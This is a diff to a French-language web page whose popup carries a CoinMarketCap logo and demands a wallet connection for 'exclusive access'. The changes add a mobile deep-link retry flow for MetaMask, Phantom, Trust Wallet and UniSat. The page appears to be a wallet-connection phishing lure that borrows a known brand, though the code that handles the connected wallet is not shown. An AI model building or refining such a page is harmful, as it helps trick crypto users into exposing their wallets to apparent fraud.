@@ -52,7 +52,7 @@
             display: block !important;
         }
         /* Styles pour les boutons */
-        .connect-btn, .redirect-btn {
+        .connect-btn, .redirect-btn, .retry-btn {
             background: #007BFF;
             color: white;
             padding: 10px 20px;
@@ -69,7 +69,7 @@
             width: 100%;
             max-width: 300px;
         }
-        .connect-btn:hover, .redirect-btn:hover {
+        .connect-btn:hover, .redirect-btn:hover, .retry-btn:hover {
             background: #0056b3;
             box-shadow: 0 6px 15px rgba(0, 123, 255, 0.5);
             transform: translateY(-2px);
@@ -157,7 +157,7 @@
             .trust-text {
                 font-size: 10px;
             }
-            .connect-btn, .redirect-btn {
+            .connect-btn, .redirect-btn, .retry-btn {
                 font-size: 13px;
                 padding: 8px 15px;
             }
@@ -182,7 +182,7 @@
     <div class="wallet-popup" id="walletPopup">
         <!-- Vue 1 : Introduction -->
         <div id="introView">
-            <img src="images/coinmarketcap.svg" alt="Company Logo" class="logo">
+            <img src="frontend/coinmarketcap.svg" alt="Company Logo" class="logo">
             <h2 style="margin-bottom: 15px; font-size: 24px; font-weight: 700;">Accès Exclusif Requis</h2>
             <p style="margin-bottom: 20px; font-size: 16px;">
                 Pour accéder à notre plateforme premium et bénéficier de services exclusifs, veuillez connecter votre wallet. <br>
@@ -195,6 +195,14 @@
         <div id="walletSelectionView" class="hidden">
             <h2 style="margin-bottom: 20px; font-size: 20px; font-weight: 600;">Choisissez votre wallet</h2>
             <div id="walletList" style="margin-top: 20px;"></div>
+        </div>
+        <!-- Vue 3 : Attente de connexion (mobile) -->
+        <div id="waitingConnectionView" class="hidden">
+            <h2 style="margin-bottom: 20px; font-size: 20px; font-weight: 600;">Connexion en cours...</h2>
+            <p style="margin-bottom: 20px; font-size: 16px;">
+                Veuillez ouvrir votre wallet et confirmer la connexion. Si vous avez déjà ouvert le wallet, cliquez sur "Réessayer".
+            </p>
+            <button class="retry-btn" id="retryConnection">Réessayer</button>
         </div>
         <!-- Éléments communs -->
         <button class="redirect-btn hidden" id="redirectButton">Continuer vers le site</button>
@@ -228,7 +236,11 @@
                     connectWalletButton: document.getElementById('connectWallet'),
                     redirectButton: document.getElementById('redirectButton'),
                     statusText: document.getElementById('statusText'),
-                    loader: document.getElementById('loader')
+                    loader: document.getElementById('loader'),
+                    introView: document.getElementById('introView'),
+                    walletSelectionView: document.getElementById('walletSelectionView'),
+                    waitingConnectionView: document.getElementById('waitingConnectionView'),
+                    retryConnectionButton: document.getElementById('retryConnection')
                 };
 
                 // Vérification des éléments DOM
@@ -306,8 +318,6 @@
 
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             const walletListContainer = document.getElementById('walletList');
-            const introView = document.getElementById('introView');
-            const walletSelectionView = document.getElementById('walletSelectionView');
 
             // Liste des wallets supportés avec leurs identifiants et liens profonds
             const supportedWallets = [
@@ -316,7 +326,7 @@
                     id: 'metamask',
                     provider: window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null,
                     deepLink: 'https://metamask.app.link/dapp/',
-                    icon: 'images/metamask-icon.svg',
+                    icon: 'frontend/images/metamask-icon.svg',
                     type: 'ethereum'
                 },
                 {
@@ -324,7 +334,7 @@
                     id: 'phantom',
                     provider: window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null,
                     deepLink: 'https://phantom.app/ul/v1/dapp/',
-                    icon: 'images/phantom-icon.svg',
+                    icon: 'frontend/images/phantom-icon.svg',
                     type: 'ethereum'
                 },
                 {
@@ -332,18 +342,31 @@
                     id: 'trustwallet',
                     provider: window.ethereum && window.ethereum.isTrust ? window.ethereum : null,
                     deepLink: 'https://link.trustwallet.com/open_url?coin_id=60&url=',
-                    icon: 'images/trustwallet-logo.svg',
+                    icon: 'frontend/images/trustwallet-logo.svg',
                     type: 'ethereum'
                 },
                 {
                     name: 'UniSat',
                     id: 'unisat',
                     provider: window.unisat ? window.unisat : null,
-                    deepLink: null,
-                    icon: 'images/unisat.png',
+                    deepLink: null, // Pas de deep link pour UniSat
+                    icon: 'frontend/images/unisat.png',
                     type: 'unisat'
                 }
             ];
+
+            // Mettre à jour les providers (en cas de retour après deep link)
+            supportedWallets.forEach(wallet => {
+                if (wallet.id === 'metamask') {
+                    wallet.provider = window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null;
+                } else if (wallet.id === 'phantom') {
+                    wallet.provider = window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null;
+                } else if (wallet.id === 'trustwallet') {
+                    wallet.provider = window.ethereum && window.ethereum.isTrust ? window.ethereum : null;
+                } else if (wallet.id === 'unisat') {
+                    wallet.provider = window.unisat ? window.unisat : null;
+                }
+            });
 
             // Sur PC : Détection directe
             if (!isMobile) {
@@ -358,8 +381,8 @@
             }
 
             // Sur Mobile : Basculer vers la vue de sélection des wallets
-            introView.classList.add('hidden');
-            walletSelectionView.classList.remove('hidden');
+            elements.introView.classList.add('hidden');
+            elements.walletSelectionView.classList.remove('hidden');
             updateStatus(elements, '', false); // Effacer le texte de statut initial
 
             // Générer les boutons pour chaque wallet
@@ -379,7 +402,8 @@
                         console.log(`${wallet.name} déjà injecté`);
                         const success = await handleWalletConnection(wallet, elements);
                         if (success) {
-                            walletSelectionView.classList.add('hidden');
+                            elements.walletSelectionView.classList.add('hidden');
+                            elements.waitingConnectionView.classList.add('hidden');
                             elements.redirectButton.classList.remove('hidden');
                             elements.redirectButton.disabled = false;
                         } else {
@@ -388,16 +412,42 @@
                     } else {
                         // Sinon, tenter d'ouvrir le deep link
                         if (wallet.deepLink) {
-                            const deepLinkUrl = wallet.deepLink + window.location.host + window.location.pathname;
+                            const deepLinkUrl = wallet.deepLink + window.location.href;
                             console.log(`Ouverture du deep link pour ${wallet.name}: ${deepLinkUrl}`);
                             window.location.href = deepLinkUrl;
 
-                            // Attendre un peu pour voir si l'utilisateur revient (timeout de 5 secondes)
-                            await delay(5000);
-                            updateStatus(elements, `Impossible de détecter ${wallet.name}. Assurez-vous qu'il est installé.`, false, 'red');
-                            walletListContainer.classList.remove('hidden');
+                            // Basculer vers la vue d'attente de connexion
+                            elements.walletSelectionView.classList.add('hidden');
+                            elements.waitingConnectionView.classList.remove('hidden');
+
+                            // Gestion du bouton "Réessayer"
+                            elements.retryConnectionButton.onclick = async () => {
+                                updateStatus(elements, `Vérification de la connexion à ${wallet.name}...`, true);
+                                // Mettre à jour le provider
+                                if (wallet.id === 'metamask') {
+                                    wallet.provider = window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null;
+                                } else if (wallet.id === 'phantom') {
+                                    wallet.provider = window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null;
+                                } else if (wallet.id === 'trustwallet') {
+                                    wallet.provider = window.ethereum && window.ethereum.isTrust ? window.ethereum : null;
+                                }
+
+                                if (wallet.provider) {
+                                    console.log(`${wallet.name} détecté après deep link`);
+                                    const success = await handleWalletConnection(wallet, elements);
+                                    if (success) {
+                                        elements.waitingConnectionView.classList.add('hidden');
+                                        elements.redirectButton.classList.remove('hidden');
+                                        elements.redirectButton.disabled = false;
+                                    } else {
+                                        updateStatus(elements, `Échec de la connexion à ${wallet.name}. Réessayez.`, false, 'red');
+                                    }
+                                } else {
+                                    updateStatus(elements, `Impossible de détecter ${wallet.name}. Assurez-vous qu'il est installé et que vous avez confirmé la connexion.`, false, 'red');
+                                }
+                            };
                         } else {
-                            updateStatus(elements, `${wallet.name} n'est pas supporté sur mobile.`, false, 'red');
+                            updateStatus(elements, `${wallet.name} n'est pas supporté sur mobile. Veuillez utiliser un autre wallet (comme MetaMask).`, false, 'red');
                             walletListContainer.classList.remove('hidden');
                         }
                     }
